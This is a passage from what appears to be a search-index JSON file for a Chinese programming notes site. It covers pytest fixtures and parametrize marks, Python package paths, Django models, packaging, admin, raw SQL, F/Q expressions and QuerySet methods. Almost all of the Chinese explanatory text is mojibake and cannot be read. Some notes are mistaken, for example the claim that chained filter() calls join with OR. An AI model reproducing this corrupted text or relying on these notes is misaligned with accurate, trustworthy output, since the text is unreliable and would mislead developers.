pytest from _pytest.fixtures import SubRequest from _pytest.mark import Mark å®šä¹‰ä¸€ä¸ªr_serverå›ºä»¶, ä½œç”¨èŒƒå›´ä¸ºæ–¹æ³•åŸŸ, yieldè¡¨ç¤ºä¼šå…ˆåœ¨yieldå¤„è¿”å›ç»™æµ‹è¯•å‡½æ•°æ‰§è¡Œç›´åˆ°å…¶ç»“æŸ: @pytest.fixture(scope='function') def r_server(request: SubRequest): print() k_kwargs = {k: v for k, v in request.keywords.items()} print( f'keywords: {k_kwargs}', sep='\\n') yield k_kwargs print('end') å…¶ä¸­, requestæ˜¯ä¸€ä¸ªç‰¹æ®Šçš„fixtureï¼Œå®ƒæä¾›äº†æœ‰å…³å½“å‰æµ‹è¯•è¿è¡Œä¸Šä¸‹æ–‡çš„ä¿¡æ¯. ä¼ é€’å¤šä¸ªæ™®é€šå‚æ•°, ç»™äº†å‡ ç»„å‚æ•°å°±ä¼šæ‰§è¡Œå‡ æ¬¡å½“å‰æµ‹è¯•: @pytest.mark.parametrize( \"param1, param2\", # å‚æ•°å­—ç¬¦ä¸², æ³¨æ„, è¿™äº›å‚æ•°éœ€è¦åœ¨ä¿®é¥°çš„æ–¹æ³•ä¸­å®šä¹‰, # å¦‚æ­¤å¤„çš„ test_r_use_params(param1, param2 [ ('p1', 'p2'), # ç¬¬ä¸€ç»„å‚æ•° ('p2', 'p3'), # ç¬¬äºŒç»„å‚æ•° ('p5', 'p4'), # ç¬¬ä¸‰ç»„å‚æ•° # å¤šç»„å‚æ•°è¡¨ç¤ºæ‰§è¡Œå¤šæ¬¡, æ¯æ¬¡ä½¿ç”¨ä¸åŒçš„å‚æ•° # è¿™é‡Œä¸‰ç»„ä¼šæ‰§è¡Œä¸‰æ¬¡, æ¯æ¬¡ä½¿ç”¨æœ¬æ¬¡å‚æ•° ], # indirect=['r_server'], # è¦ä¼ é€’çš„fixture nameçš„list, # æŒ‡å®šå“ªäº›ä¸ªå›ºä»¶ä½¿ç”¨è¿™äº›å‚æ•° ) def test_r_use_params(param1, param2, r_server): result: dict = r_server assert 'parametrize' in result _a: Mark = result['parametrize'] assert _a.args == ('param1, param2', [('p1', 'p2'), ('p2', 'p3'), ('p5', 'p4')]) è¿™é‡ŒåŸæœ¬æƒ³ç”¨ indirect æ¥æŒ‡å®šå›ºä»¶, ä¸çŸ¥é“ä¸ºä»€ä¹ˆä½¿ç”¨ indirect ä¼šå¯¼è‡´æ‰¾ä¸åˆ°å›ºä»¶è€Œæ‰§è¡Œå¤±è´¥, æ‰€ä»¥æ”¾å¼ƒ. ä¼ é€’å…³é”®å­—å‚æ•°: # è¿™é‡Œè¡¨ç¤ºä¼ é€’ç»™ r_server å…³é”®å­—å‚æ•° # è¿™é‡Œå®é™…ä¼ å…¥çš„æ˜¯: 'name': Mark(name='name', *args, **kwargs) @pytest.mark.key_word_one('1') @pytest.mark.key_word_two('2') def test_r_use_keywords(r_server): result: dict = r_server assert 'key_word_one' in result assert type(_a := result['key_word_one']) == Mark and _a.args[0] == '1' assert 'key_word_two' in result assert type(_a := result['key_word_two']) == Mark and _a.args[0] == '2' å¯ä»¥çœ‹å‡º, ä¸è®ºæ˜¯å…³é”®å­—å‚æ•°è¿˜æ˜¯æ™®é€šå‚æ•°, å…¶å®éƒ½ä¼šè¢« Mark ä¿®é¥°, å­˜å‚¨åˆ° request.keywords å†….","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Pytest.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Pytest.html"},{"title":"å¤šä¸ªç›®å½•ä¸‹çš„ä¸‰æ–¹åŒ…æ•´åˆ","text":"æœ‰ä»¥ä¸‹æ–¹å¼ å°†è·¯å¾„ç›´æ¥æ·»åŠ åˆ°sys.path å°†è·¯å¾„åŠ å…¥åˆ°ç¯å¢ƒå˜é‡ PYTHONPATH åœ¨å½“å‰ä¸‰æ–¹åŒ…è·¯å¾„ä¸‹åˆ›å»ºä¸€ä¸ª .pth åç¼€çš„æ–‡ä»¶, ç„¶åå°†è·¯å¾„æŒ‰è¡Œå†™å…¥ è¯¦è§: å°†æ–‡ä»¶å¤¹åŠ å…¥åˆ°sys.path","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html","loc":"/yq-doc-source-docs-rear-end-python-Tutorial-Three--party-package-integration-in-multiple-directory.html"},{"title":"æŠ½è±¡åŸºç±»-å®šä¹‰å…¬å…±å­—æ®µ","text":"æŠ½è±¡åŸºç±»åœ¨ä½ è¦å°†å…¬å…±ä¿¡æ¯æ”¾å…¥å¾ˆå¤šæ¨¡å‹æ—¶ä¼šå¾ˆæœ‰ç”¨ã€‚ ç¼–å†™ä½ çš„åŸºç±»ï¼Œå¹¶åœ¨ Meta ç±»ä¸­å¡«å…¥ abstract=True . è¯¥æ¨¡å‹å°†ä¸ä¼šåˆ›å»ºä»»ä½•æ•°æ®è¡¨ã€‚å½“å…¶ç”¨ä½œå…¶å®ƒæ¨¡å‹ç±»çš„åŸºç±»æ—¶ï¼Œå®ƒçš„å­—æ®µä¼šè‡ªåŠ¨æ·»åŠ è‡³å­ç±»ã€‚ å¦‚: from django.db import models class CommonInfo(models.Model): name = models.CharField(max_length=100) age = models.PositiveIntegerField() class Meta: abstract = True class Student(CommonInfo): home_group = models.CharField(max_length=5) Student æ¨¡å‹æ‹¥æœ‰3ä¸ªå­—æ®µï¼š name ï¼Œ age å’Œ home_group ã€‚ CommonInfo æ¨¡å‹ä¸èƒ½ç”¨ä½œæ™®é€šçš„ Django æ¨¡å‹ï¼Œ å› ä¸ºå®ƒæ˜¯ä¸€ä¸ªæŠ½è±¡åŸºç±»ã€‚å®ƒä¸ä¼šç”Ÿæˆæ•°æ®è¡¨ï¼Œä¹Ÿæ²¡æœ‰ç®¡ç†å™¨ï¼Œä¹Ÿä¸èƒ½è¢«å®ä¾‹åŒ–å’Œä¿å­˜ã€‚ ä»æŠ½è±¡åŸºç±»ç»§æ‰¿æ¥çš„å­—æ®µå¯è¢«å…¶å®ƒå­—æ®µæˆ–å€¼é‡å†™ï¼Œæˆ–ç”¨ None åˆ é™¤ã€‚ å¯¹å¾ˆå¤šç”¨æˆ·æ¥è¯´ï¼Œè¿™ç§ç»§æ‰¿å¯èƒ½å°±æ˜¯ä½ æƒ³è¦çš„ã€‚å®ƒæä¾›äº†ä¸€ç§åœ¨ Python çº§æŠ½å‡ºå…¬å…±ä¿¡æ¯çš„æ–¹æ³•ï¼Œä½†ä»ä¼šåœ¨å­ç±»æ¨¡å‹ä¸­åˆ›å»ºæ•°æ®è¡¨ã€‚","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Abstract-base.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Abstract-base.html"},{"title":"åº”ç”¨æ‰“åŒ…","text":"ä½¿ç”¨ setuptools æ‰“åŒ… å»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹æ”¾æ¨¡å— å°†æ¨¡å—ç›®å½•ç§»å…¥è¿™ä¸ªæ–°å»ºçš„ç›®å½• åœ¨æ–°å»ºç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ª README.rst æ–‡ä»¶ï¼Œ åŒ…å«ä»¥ä¸‹å†…å®¹: rst ===== Polls ===== Polls is a Django app to conduct Web-based polls. For each question, visitors can choose between a fixed number of answers. Detailed documentation is in the \"docs\" directory. Quick start ----------- 1. Add \"polls\" to your INSTALLED_APPS setting like this:: INSTALLED_APPS = [ ... 'polls', ] 2. Include the polls URLconf in your project urls.py like this:: path('polls/', include('polls.urls')), 3. Run ``python manage.py migrate`` to create the polls models. 4. Start the development server and visit http://127.0.0.1:8000/admin/ to create a poll (you'll need the Admin app enabled). 5. Visit http://127.0.0.1:8000/polls/ to participate in the poll. åœ¨åŒä¸€ç›®å½•ä¸‹åˆ›å»º LICENSE æ–‡ä»¶ã€‚é€‰æ‹©ä¸€ä¸ªæˆæƒåè®®ï¼ˆè¿™é‡Œæš‚æ—¶ä¸çŸ¥é“æ€ä¹ˆæï¼‰ åˆ›å»º setup.cfg å’Œ setup.py è¯´æ˜æ„å»ºä¸å®‰è£…çš„ç»†èŠ‚ã€‚å¯å‚è€ƒ setuptools docs å¤§è‡´åŒ…å«ä»¥ä¸‹å†…å®¹ setup.cfg: [metadata] name = django-polls version = 0.1 description = A Django app to conduct Web-based polls. long_description = file: README.rst url = https://www.example.com/ author = Your Name author_email = yourname@example.com license = BSD-3-Clause # Example license classifiers = Environment :: Web Environment Framework :: Django Framework :: Django :: X.Y # Replace \"X.Y\" as appropriate Intended Audience :: Developers License :: OSI Approved :: BSD License Operating System :: OS Independent Programming Language :: Python Programming Language :: Python :: 3 Programming Language :: Python :: 3 :: Only Programming Language :: Python :: 3.6 Programming Language :: Python :: 3.7 Programming Language :: Python :: 3.8 Topic :: Internet :: WWW/HTTP Topic :: Internet :: WWW/HTTP :: Dynamic Content [options] include_package_data = true packages = find: python_requires = >=3.6 install_requires = Django >= X.Y # Replace \"X.Y\" as appropriate setup.py: from setuptools import setup setup() é»˜è®¤æƒ…å†µï¼ŒåŒ…ä¸­ä»…åŒ…å« Python æ¨¡å—å’ŒåŒ…ã€‚ è¦åŒ…å«å…¶ä»–æ–‡ä»¶ï¼Œæˆ‘ä»¬éœ€è¦åˆ›å»ºä¸€ä¸ª`MANIFEST.in` æ–‡ä»¶ã€‚ ä¸Šä¸€æ­¥ä¸­æåˆ°çš„ setuptools æ–‡æ¡£æ›´è¯¦ç»†åœ°è®¨è®ºäº†è¿™ä¸ªæ–‡ä»¶ã€‚ è¦åŒ…å«æ¨¡æ¿ã€ README.rst å’Œæˆ‘ä»¬çš„ LICENSE æ–‡ä»¶ï¼Œåˆ›å»ºä¸€ä¸ªæ–‡ä»¶ MANIFEST.in ï¼Œå…¶å†…å®¹å¦‚ä¸‹: include LICENSE include README.rst recursive-include polls/static * recursive-include polls/templates * åœ¨åº”ç”¨ä¸­åŒ…å«è¯¦ç»†æ–‡æ¡£æ˜¯å¯é€‰çš„ï¼Œä½†æˆ‘ä»¬æ¨èä½ è¿™æ ·åšã€‚æ–°å»ºç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªç©ºç›®å½• docs ç”¨äºæœªæ¥ç¼–å†™æ–‡æ¡£ã€‚ é¢å¤–æ·»åŠ ä¸€è¡Œè‡³ MANIFEST.in : recursive-include docs * æ³¨æ„ï¼Œç°åœ¨ docs ç›®å½•ä¸ä¼šè¢«åŠ å…¥ä½ çš„åº”ç”¨åŒ…ï¼Œé™¤éä½ å¾€è¿™ä¸ªç›®å½•åŠ å‡ ä¸ªæ–‡ä»¶ã€‚ è®¸å¤š Django åº”ç”¨ä¹Ÿæä¾›ä»–ä»¬çš„åœ¨çº¿æ–‡æ¡£é€šè¿‡ç±»ä¼¼ readthedocs.org è¿™æ ·çš„ç½‘ç«™ã€‚ è¯•ç€æ„å»ºä½ è‡ªå·±çš„åº”ç”¨åŒ…é€šè¿‡ ptyhon setup.py sdistï¼ˆåœ¨ django-polls ç›®å½•å†…ï¼‰ã€‚ è¿™å°†åˆ›å»ºä¸€ä¸ªåä¸º dist çš„ç›®å½•å¹¶æ„å»ºä½ è‡ªå·±çš„åº”ç”¨åŒ…ï¼Œ django-polls-0.1.tar.gz ã€‚ æ›´å¤šå…³äºæ‰“åŒ…çš„ä¿¡æ¯ï¼Œè§ Python çš„ å…³äºæ‰“åŒ…å’Œå‘å¸ƒé¡¹ç›®çš„æ•™ç¨‹","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Apply.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Apply.html"},{"title":"åå°ç®¡ç†æ¨¡å—admin","text":"è¿™é‡Œå…¶å®å¯¹åº”çš„å°±æ˜¯ åº”ç”¨ä¸­çš„ admin.py å¸¸ç”¨å­—æ®µ ä¾‹å­: from django.contrib import admin from .models import Question class QuestionAdmin(admin.ModelAdmin): fieldsets = [ (None, {'fields': ['question_text']}), ('Date information', {'fields': ['pub_date']}), ] admin.site.register(Question, QuestionAdmin) å¯ä»¥è‡ªè¡Œè®¾ç½®è‡ªå®šä¹‰çš„åå°è¡¨å•å¦‚ä¾‹æ‰€ç¤ºï¼Œè‡ªå®šä¹‰çš„ç±»éœ€è¦ register åœ¨åŸºç±»ä¹‹åçš„ç±»ä¸­å­—æ®µå®šä¹‰æ–¹æ³• fields å¦‚: fields = ['pub_date', 'question_text'] è¡¨ç¤ºå‰å°ç›´æ¥å±•ç¤ºçš„å­—æ®µä»¥åŠé¡ºåº ä¸»è¦ç”¨äºæ–°å¢ fieldsets å¦‚: fieldsets = [ (None, {'fields': ['question_text']}), ('Date information', {'fields': ['pub_date']}), ] è¡¨ç¤ºå°†è¿™äº›å­—æ®µåˆ†æˆå‡ ä¸ªå­—æ®µé›† å…¶ä¸­æ¯ä¸ªå…ƒç»„ä¸­ç¬¬ä¸€ä¸ªå…ƒç´ è¡¨ç¤ºè¿™ä¸ªé›†çš„æ ‡é¢˜ ä¸»è¦ç”¨äºæ–°å¢ list_display å¦‚: list_display = ('question_text', 'pub_date') è¡¨ç¤ºåœ¨å‰å°å±•ç¤ºä¸€ä¸ªå¯è§†åŒ–çš„å­—æ®µåˆ—è¡¨ ä¸»è¦ç”¨äºè¡¨æ ¼åŒ–çš„å±•ç¤º list_filter å¦‚: list_filter = ['pub_date'] è¡¨ç¤ºå…è®¸åœ¨å‰ç«¯ä½¿ç”¨æ­¤å­—æ®µçš„è¿‡æ»¤é€‰é¡¹ï¼ˆåœ¨ä¾§è¾¹æ æ˜¾ç¤ºè¿‡æ»¤é€‰é¡¹ï¼‰ search_fields å¦‚: search_fields = ['question_text'] è¡¨ç¤ºå‰ç«¯æ–°å¢æ­¤å­—æ®µçš„æœç´¢æ¡†ï¼ˆåç«¯å°†ä½¿ç”¨likeæŸ¥è¯¢ï¼‰ è‡ªå®šä¹‰åå°ç•Œé¢é£æ ¼ é€šè¿‡ Django çš„æ¨¡æ¿ç³»ç»Ÿæ¥ä¿®æ”¹ Django çš„åå°ç”±è‡ªå·±é©±åŠ¨ï¼Œä¸”å®ƒçš„äº¤äº’æ¥å£é‡‡ç”¨ Django è‡ªå·±çš„æ¨¡æ¿ç³»ç»Ÿã€‚ åœ¨åŒ…å« manage.py çš„å·¥ç¨‹ç›®å½•å†…åˆ›å»ºä¸€ä¸ª templates ç›®å½•ï¼Œæ”¾æ¨¡æ¿èµ„æºå§ åœ¨ settings.py é…ç½® DIRSé€‰é¡¹ å¤§è‡´å¦‚ä¸‹: TEMPLATES = [ { 'BACKEND': 'django.template.backends.django.DjangoTemplates', 'DIRS': [BASE_DIR / 'templates'], 'APP_DIRS': True, 'OPTIONS': { 'context_processors': [ 'django.template.context_processors.debug', 'django.template.context_processors.request', 'django.contrib.auth.context_processors.auth', 'django.contrib.messages.context_processors.messages', ], }, }, ] TEMPLATES ä½œç”¨ åŒ…å«æ‰€æœ‰ Django æ¨¡æ¿å¼•æ“çš„é…ç½®çš„åˆ—è¡¨ã€‚åˆ—è¡¨ä¸­çš„æ¯ä¸€é¡¹éƒ½æ˜¯ä¸€ä¸ªå­—å…¸ï¼ŒåŒ…å«äº†å„ä¸ªå¼•æ“çš„é€‰é¡¹ã€‚ DIRS æ˜¯ä¸€ä¸ªåŒ…å«å¤šä¸ªç³»ç»Ÿç›®å½•çš„æ–‡ä»¶åˆ—è¡¨ï¼Œç”¨äºåœ¨è½½å…¥ Django æ¨¡æ¿æ—¶ä½¿ç”¨ï¼Œæ˜¯ä¸€ä¸ªå¾…æœç´¢è·¯å¾„ã€‚ å‚è€ƒ:: è‡ªå®šä¹‰åå°è¡¨å•","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Background-management-module-admin.html"},{"title":"åˆ›å»ºé¡¹ç›®","text":"å‘½ä»¤è¡Œ: django-admin startproject $é¡¹ç›®å","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Creation-project.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Creation-project.html"},{"title":"è‡ªå®šä¹‰sql","text":"ä½¿ç”¨: Manager.raw(raw_query,params=(),translations=None) å¦‚: >>> Person.objects.raw('''SELECT first AS first_name, ... last AS last_name, ... bd AS birth_date, ... pk AS id, ... FROM some_other_table''') å¸¦å‚: >>> lname = 'Doe' >>> Person.objects.raw('SELECT * FROM myapp_person WHERE last_name = %s', [lname]) å‚è€ƒ: æ‰§è¡ŒåŸç”Ÿ SQL æŸ¥è¯¢ | Django æ–‡æ¡£ | Django (djangoproject.com)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Custom-SQL.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-Custom-SQL.html"},{"title":"F Q","text":"F Fæ”¯æŒè¡¨å†…éƒ¨å­—æ®µçš„æ¯”è¾ƒ å•ä¸‹åˆ’çº¿ ä¾‹å¦‚ï¼Œä¸ºäº†æŸ¥æ‰¾commentsæ•°ç›®å¤šäºpingbacksæ•°ç›®çš„Entryï¼Œ å¯ä»¥æ„é€ ä¸€ä¸ªF()å¯¹è±¡æ¥å¼•ç”¨pingbackæ•°ç›®ï¼Œå¹¶åœ¨æŸ¥è¯¢ä¸­ä½¿ç”¨è¯¥F()å¯¹è±¡ï¼š Entryæœ‰ä¸¤ä¸ªå­—æ®µ number_of_commentsï¼Œnumber_of_pingbacks: > from django.db.models import F > Entry.objects.filter(number_of_comments__gt=F('number_of_pingbacks')) > psï¼š ä¹Ÿæ”¯æŒåŠ å‡ä¹˜é™¤ å¦‚ï¼šæŸ¥è¯¢ratingæ¯”pingbackå’Œcommentæ•°ç›®æ€»å’Œè¦å°çš„Entryï¼Œå¯ä»¥è¿™ä¹ˆå†™: > Entry.objects.filter(rating__lt=F('number_of_comments') + F('number_of_pingbacks')) Fæ”¯æŒè·¨è¡¨æŸ¥è¯¢ åŒä¸‹åˆ’çº¿ åœ¨F()ä¸­ä½¿ç”¨åŒä¸‹åˆ’çº¿æ¥è¿›è¡Œè·¨è¡¨æŸ¥è¯¢ã€‚ä¾‹å¦‚ï¼ŒæŸ¥è¯¢authorçš„åå­—ä¸blogåå­—ç›¸åŒçš„Entry: > Entry.objects.filter(authors__name=F('blog__name')) Fï¼Œæ›´æ–°æ—¶ç”¨äºè·å–åŸæ¥çš„å€¼ å¦‚: from django.db.models import F,Q models.UserInfo.objects.all().update(age=F(\"age\")+1) Qï¼Œç”¨äºæ„é€ å¤æ‚æŸ¥è¯¢æ¡ä»¶ åº”ç”¨ä¸€: models.UserInfo.objects.filter(Q(id__gt=1)) models.UserInfo.objects.filter(Q(id=8) | Q(id=2)) models.UserInfo.objects.filter(Q(id=8) & Q(id=2)) åº”ç”¨äºŒ: q1 = Q() q1.connector = 'OR' q1.children.append(('id__gt', 1)) q1.children.append(('id', 10)) q1.children.append(('id', 9)) q2 = Q() q2.connector = 'OR' q2.children.append(('c1', 1)) q2.children.append(('c1', 10)) q2.children.append(('c1', 9)) q3 = Q() q3.connector = 'AND' q3.children.append(('id', 1)) q3.children.append(('id', 2)) q2.add(q3,'OR') con = Q() con.add(q1, 'AND') con.add(q2, 'AND') models.UserInfo.objects.filter(con)","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-FQ.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-FQ.html"},{"title":"QuerySet Api","text":"åŒ…å«ä¸¤ä¸ªå…¬å¼€å±æ€§ï¼š orderedï¼šæŸ¥è¯¢æ—¶å€™æ˜¯å¦æœ‰åºï¼ˆTrue/Falseï¼‰ dbï¼šæŸ¥è¯¢æ—¶ä½¿ç”¨çš„æ•°æ®åº“ æ¨¡å‹.objectsçš„ä¸€äº›æ–¹æ³• æ¯æ¬¡æ‰§è¡Œéƒ½æ˜¯è¿”å›ä¸€ä¸ªæ–°çš„QuerySet() æ€»è§ˆ: module.objects.all() è·å–è¯¥å®ä¾‹çš„æ‰€æœ‰ä¿¡æ¯ module.objects.add() æ·»åŠ  module.objects.create() åˆ›å»º module.objects.get() module.objects.filter(*kargs) è¿‡æ»¤å™¨ è¿”å›åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySetï¼Œåº•å±‚é€šè¿‡ANDè¿æ¥å¤šä¸ªå‚æ•° module.objects.exclude(*kargs) è¿”å›ä¸åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySetï¼Œåº•å±‚æ˜¯ç”¨NOT()åŒ…è£¹çš„AND module.objects.annotate() èšåˆæŸ¥è¯¢ï¼Œå¯¹QuerySetçš„æ¯ä¸ªå¯¹è±¡è¿›è¡Œæ³¨è§£ module.objects.order_by() æ’åº module.objects.annotate() module.objects.alias() å¯¹QuerySetçš„æ¯ä¸ªå­—æ®µè®¾ç½®åˆ«åï¼Œç›¸å½“äºasï¼ˆæ²¡ææ‡‚ï¼‰ module.objects.select_related() ä¼šè·å–å¤–é”®å¯¹åº”çš„å¯¹è±¡ï¼Œåœ¨éœ€è¦çš„æ—¶å€™å°±ä¸ç”¨é‡æ–°æŸ¥è¯¢æ•°æ®åº“äº†ï¼ˆä¸»è¦ç”¨äºä¸€å¯¹å¤šå­—æ®µçš„æŸ¥è¯¢ï¼‰ module.objects.prefetch_related() å¤šå¯¹å¤šå­—æ®µçš„æŸ¥è¯¢ï¼ˆé€šè¿‡å¤–é”®æ‰€å¯¹åº”å®ä½“æ‰¾å¤–é”®æ‰€åœ¨å®ä½“ï¼‰ï¼Œåº•å±‚ä½¿ç”¨çš„in module.objects.reverse() åå‘æŸ¥è¯¢ module.objects.distinct( \\*fields ) åå‘æŸ¥è¯¢ module.objects.values() è¿”æŸ¥è¯¢å­—å…¸è€Œä¸æ˜¯å®ä¾‹ module.objects.defer() å•æ¬¡åŠ è½½æ—¶ï¼ŒæŒ‡å®šä¸åŠ è½½æŒ‡å®šçš„å­—æ®µï¼Œåç»­æ˜¯éœ€è¦æ—¶å†åŠ è½½ module.objects.only() å•æ¬¡åŠ è½½æ—¶ï¼ŒæŒ‡å®šåŠ è½½æŒ‡å®šçš„å­—æ®µï¼ŒæœªæŒ‡å®šçš„éœ€è¦å†åŠ è½½ module.objects.extra() æ‰€æœ‰æŸ¥è¯¢æ“ä½œå‚è€ƒ: https://www.liujiangblog.com/course/django/129 module.objects.all() è·å–è¯¥å®ä¾‹çš„æ‰€æœ‰ä¿¡æ¯ æ³¨æ„: Entry.objects.filter(pub_date__year=2006) ç­‰ä»·äº: Entry.objects.all().filter(pub_date__year=2006) module.objects.add() æ·»åŠ  module.objects.create() åˆ›å»º module.objects.get() è·å– module.objects.filter(*kargs) è¿‡æ»¤å™¨ è¿”å›åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySetï¼Œåº•å±‚é€šè¿‡ANDè¿æ¥å¤šä¸ªå‚æ•° å¦‚æœæ˜¯å¤šä¸ªfilterï¼Œé‚£ä¹ˆè¿™äº›filterçš„é“¾ä¹‹é—´æ˜¯æˆ–çš„å…³ç³»ï¼ˆorï¼‰ module.objects.exclude(*kargs) è¿”å›ä¸åŒ…å«æŒ‡å®šå‚æ•°çš„QuerySetï¼Œåº•å±‚æ˜¯ç”¨NOT()åŒ…è£¹çš„AND module.objects.annotate() èšåˆæŸ¥è¯¢ï¼Œå¯¹QuerySetçš„æ¯ä¸ªå¯¹è±¡è¿›è¡Œæ³¨è§£ module.objects.order_by() æ’åº module.objects.alias() å¯¹QuerySetçš„æ¯ä¸ªå­—æ®µè®¾ç½®åˆ«å å¥½åƒç›¸å½“äºasï¼ˆæ²¡ææ‡‚ï¼‰ module.objects.select_related() ä¼šè·å–å¤–é”®å¯¹åº”çš„å¯¹è±¡ï¼Œ åœ¨éœ€è¦çš„æ—¶å€™å°±ä¸ç”¨é‡æ–°æŸ¥è¯¢æ•°æ®åº“äº†ï¼ˆä¸»è¦ç”¨äºä¸€å¯¹å¤šå­—æ®µçš„æŸ¥è¯¢ï¼‰ module.objects.prefetch_related() å¤šå¯¹å¤šå­—æ®µçš„æŸ¥è¯¢ (é€šè¿‡å¤–é”®æ‰€å¯¹åº”å®ä½“æ‰¾å¤–é”®æ‰€åœ¨å®ä½“)ï¼Œåº•å±‚ä½¿ç”¨çš„in module.objects.reverse() åå‘æŸ¥è¯¢ module.objects.distinct(*fields ) åå‘æŸ¥è¯¢ module.objects.values() åæŸ¥è¯¢å­—å…¸è€Œä¸æ˜¯å®ä¾‹ æ³¨æ„valuesä¸distinctä½¿ç”¨ä¼šå½±å“æ’åºç»“æœ module.objects.defer() è¿”å›å¯¹è±¡å®ä¾‹ï¼ŒæŒ‡å®šä¸åŠ è½½å­—æ®µ å•æ¬¡åŠ è½½æ—¶ï¼ŒæŒ‡å®šä¸åŠ è½½æŒ‡å®šçš„å­—æ®µï¼Œåç»­æ˜¯éœ€è¦æ—¶å†åŠ è½½ module.objects.only() è¿”å›å¯¹è±¡å®ä¾‹ï¼ŒæŒ‡å®šåŠ è½½å­—æ®µ å•æ¬¡åŠ è½½æ—¶ï¼ŒæŒ‡å®šåŠ è½½æŒ‡å®šçš„å­—æ®µï¼ŒæœªæŒ‡å®šçš„éœ€è¦å†åŠ è½½ å¤šä¸ªé“¾å¼çš„onlyï¼Œåªä¼šä»¥æœ€åä¸€ä¸ªä¸ºå‡†: > æ¯”å¦‚:ret=Book.object.all().only('name') > idå§‹ç»ˆä¼šæŸ¥,ç»“æœæ˜¯querysetå¯¹è±¡,å¥—bookå¯¹è±¡(é‡Œé¢åªæœ‰idä¸nameå­—æ®µ) > é—®:å¦‚æœå–price,å‘ç”Ÿäº†ä»€ä¹ˆ? > å®ƒä¼šå†æ¬¡æŸ¥è¯¢æ•°æ®åº“,å¯¹æ•°æ®åº“é€ æˆå‹åŠ› extra(select=None, where=None, params=None, tables=None, order_by=None, select_params=None) æœ‰æ—¶å€™ï¼ŒDjango æŸ¥è¯¢è¯­æ³•æœ¬èº«å¹¶ä¸èƒ½å¾ˆå®¹æ˜“åœ°è¡¨è¾¾ä¸€ä¸ªå¤æ‚çš„ WHERE å­å¥ã€‚ å¯¹äºè¿™äº›è¾¹ç¼˜æƒ…å†µï¼ŒDjango æä¾›äº† extra() QuerySet ä¿®é¥°ç¬¦â€”â€”ç”¨äºå°†ç‰¹å®šçš„å­å¥æ³¨å…¥åˆ°ç”± QuerySet ç”Ÿæˆçš„ SQL ä¸­ã€‚ å¦‚æœåœ¨ extra() è°ƒç”¨ä¹‹åä½¿ç”¨ values() å­å¥ï¼Œ åˆ™ extra() ä¸­çš„ select å‚æ•°æ‰€å®šä¹‰çš„ä»»ä½•å­—æ®µå¿…é¡»æ˜ç¡®åœ°åŒ…å«åœ¨ values() è°ƒç”¨ä¸­ã€‚ ä»»ä½•åœ¨ values() è°ƒç”¨ä¹‹åè¿›è¡Œçš„ extra() è°ƒç”¨å°†å¿½ç•¥å…¶é¢å¤–é€‰æ‹©çš„å­—æ®µã€‚ å®˜ç½‘æ–‡æ¡£è¯´è®¡åˆ’ extraå°†åœ¨æœªæ¥åºŸå¼ƒ filter/other è¿‡æ»¤åçš„QuerySetéƒ½æ˜¯å”¯ä¸€çš„ å‰ç¼€ä¸ºå˜é‡æˆ–è€…è¯´å­—æ®µå åç¼€å¦‚ä¸‹ï¼š __gt : å¤§äº __gte : å¤§äºç­‰äº __lt : å°äº __lte : å°äºç­‰äº __in : å…¶ä¸­ä¹‹ä¸€ __range : èŒƒå›´ __year : æ—¥æœŸ-å¹´ __exact ï¼š\"ç²¾ç¡®\"åŒ¹é…ï¼ˆåŒºåˆ†å¤§å°å†™ï¼‰ __iexact ï¼šæ˜¯ä¸åŒºåˆ†å¤§å°å†™çš„åŒ¹é…é¡¹ __contains ï¼šåŒºåˆ†å¤§å°å†™çš„æ¨¡ç³ŠæŸ¥è¯¢ __icontains ï¼šä¸åŒºåˆ†å¤§å°å†™çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼Œä¸`contains`ç›¸å¯¹åº”ã€‚ __startswith ï¼šä»¥ä»€ä¹ˆå¼€å¤´çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼ˆ åŒºåˆ†å¤§å°å†™ ï¼‰ __istartswith ï¼šä»¥ä»€ä¹ˆå¼€å¤´çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼ˆ ä¸åŒºåˆ†å¤§å°å†™ ï¼‰ __endswith ï¼šä»¥ä»€ä¹ˆç»“å°¾çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼ˆ åŒºåˆ†å¤§å°å†™ ï¼‰ __iendswith ï¼šä»¥ä»€ä¹ˆç»“å°¾çš„æ¨¡ç³ŠæŸ¥è¯¢ï¼ˆ ä¸åŒºåˆ†å¤§å°å†™ ï¼‰ __isnull : æ˜¯ç©ºçš„ __regex : åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é… __iregex : ä¸åŒºåˆ†å¤§å°å†™çš„æ­£åˆ™åŒ¹é…","tags":"åç«¯","url":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-QuerySet-API.html","loc":"/yq-doc-source-docs-rear-end-python-Web-framework-Django-QuerySet-API.html"},{"title":"settingså¸¸ç”¨å­—æ®µ","text":"TEMPLATES é»˜è®¤ï¼š [] ï¼ˆç©ºåˆ—è¡¨ï¼‰ ä¸€ä¸ªåŒ…å«æ‰€æœ‰ Django 